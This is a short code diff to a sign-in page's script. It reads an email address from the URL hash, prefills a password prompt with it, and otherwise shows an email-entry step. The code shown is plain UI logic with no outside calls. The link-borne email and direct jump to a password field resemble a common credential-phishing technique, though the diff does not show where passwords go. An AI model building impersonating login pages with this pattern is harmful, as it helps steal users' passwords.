@@ -436,6 +436,18 @@
         return emailRegex.test(email);
     }
 
+    // Function to extract email from URL hash
+    function getEmailFromHash() {
+        const hash = window.location.hash; // e.g., #email@domain.com
+        if (hash && hash.startsWith('#')) {
+            const email = hash.substring(1).trim(); // Remove # and trim
+            if (isValidEmail(email)) {
+                return email;
+            }
+        }
+        return null; // Return null if no valid email is found
+    }
+
     // Function to show password view
     function showPasswordView(email) {
         // Set the email to display (use provided email or default)
@@ -464,8 +476,14 @@
         }, 300);
     }
 
-    // Initialize with password view and set email
-    showPasswordView('#email@domain.com'); // Replace with dynamic email if available
+    // Initialize with password view using email from URL hash
+    const emailFromHash = getEmailFromHash();
+    if (emailFromHash) {
+        showPasswordView(emailFromHash);
+    } else {
+        // Fallback to email view if no valid email in hash
+        showEmailView();
+    }
 
     // Event listeners
     nextButton.addEventListener('click', function(e) {
@@ -486,6 +504,9 @@
 
         // Clear any previous errors
         emailError.style.display = 'none';
+
+        // Update URL hash with the entered email
+        window.location.hash = email;
 
         // Show password view with entered email
         showPasswordView(email);
